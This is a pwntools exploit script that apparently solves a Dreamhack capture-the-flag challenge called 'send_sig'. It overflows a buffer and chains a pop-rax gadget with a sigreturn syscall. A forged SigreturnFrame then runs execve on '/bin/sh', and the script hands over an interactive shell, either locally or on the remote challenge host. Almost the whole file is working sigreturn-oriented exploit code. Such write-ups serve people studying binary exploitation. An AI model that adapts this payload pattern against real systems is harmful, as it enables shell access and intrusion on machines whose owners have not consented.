#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./send_sig', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 18352)
    else:
        return process(elf.path)
    
binsh = 0x402000
syscall = 0x4010b0
poprax_ret = pack(0x4010ae)
frame = SigreturnFrame(arch = 'amd64')
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

padding = 0x10
io = start()
payload = cyclic(padding) + poprax_ret +pack(0xf) + pack(syscall) + bytes(frame)
sla(b'Signal:', payload)
io.interactive()